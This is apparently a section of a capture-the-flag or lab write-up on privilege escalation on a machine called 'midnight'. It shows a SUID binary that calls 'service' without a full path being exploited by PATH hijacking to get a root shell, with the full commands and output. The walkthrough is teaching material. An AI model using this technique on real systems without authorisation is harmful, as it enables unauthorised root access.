# 7 privesc

```
# we can ssh as jose
$ ssh jose@192.168.122.88

jose@midnight:~$ whoami;id
jose
uid=1000(jose) gid=1000(jose) groups=1000(jose),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

## SuidEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/status
------------------------------
```

```
jose@midnight:~$ strings /usr/bin/status
[truncated]
Status of the SSH server:
service ssh status

# service is not fully resolved.
jose@midnight:~$ which service

# no such file exists in path
jose@midnight:~$ echo "/bin/sh" > service
jose@midnight:~$ chmod +x service
jose@midnight:~$ export PATH=/home/jose:$PATH
jose@midnight:~$ /usr/bin/status
# whoami;id
root
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)
```
